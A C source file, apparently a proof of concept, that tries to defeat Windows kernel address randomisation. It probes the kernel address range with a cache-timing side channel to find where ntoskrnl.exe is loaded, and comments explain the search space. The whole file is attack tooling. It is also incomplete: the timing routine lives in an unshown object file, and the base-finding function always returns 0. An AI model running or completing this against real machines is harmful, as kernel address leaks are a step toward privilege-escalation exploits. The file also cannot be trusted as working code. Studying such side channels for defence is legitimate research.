#include <stdio.h>
#include <stdint.h>
// gcc nokaslr.c nokaslr.o -o nokaslr.exe

/*
https://msrc.microsoft.com/blog/2022/04/randomizing-the-kuser_shared_data-structure-on-windows/

0x0000000000000000 -> 0x00007FFFFFFFFFFF  -> Espace user-mode (128 To)
0xFFFF080000000000 -> 0xFFFFFFFFFFFFFFFF  -> Espace kernel-mode (128 To)

OLD exemple : 
kASLR load ntoskrnl.exe in a range of 0x800000000 (32Go)
aligned on 21bits => 0b100000000000000000000 => 0x100000 (1Mo)

so every 1Mb is a potential space of ntoskrn.exe : 
    range // step = 0x8000 : 32 768 possibilités
*/
#define START_KADDR 0xfffff80000000000ULL
#define STOP_KADDR 0xfffff80500000000ULL

#define KSTEP_SIZE  0x100000
#define KSTEPS ((STOP_KADDR - START_KADDR) / KSTEP_SIZE)
#define PASS_CNT 10

#define uint64 uintptr_t

unsigned int cacheTiming(void* addr);

uint64 getKrnlBase(){
    uint64 timings[KSTEPS] = {0};
    uint64 addrs[KSTEPS] = {0};
    int sum = 0;

    for (uint64 i = 0; i < KSTEPS; i++) {
        if (!addrs[i])
            addrs[i] = START_KADDR + i * KSTEP_SIZE;
        for (int y = 0; y < PASS_CNT; y++){
            sum += cacheTiming((void*)(uintptr_t)addrs[i]);
        }
        unsigned int t = sum / PASS_CNT;
        sum = 0;
        
        timings[i] = t;
        if ((t / 100) < 170)
            printf("[debug] %p ; %d\n", addrs[i], (t/100));
    }

    return 0;
}


int main(int argc, char** argv){
    uint64 ntoskrnl_base = 0;

    ntoskrnl_base = getKrnlBase();

    printf("[*] ntoskrnl base : 0x%llx", ntoskrnl_base);
    return 0;
}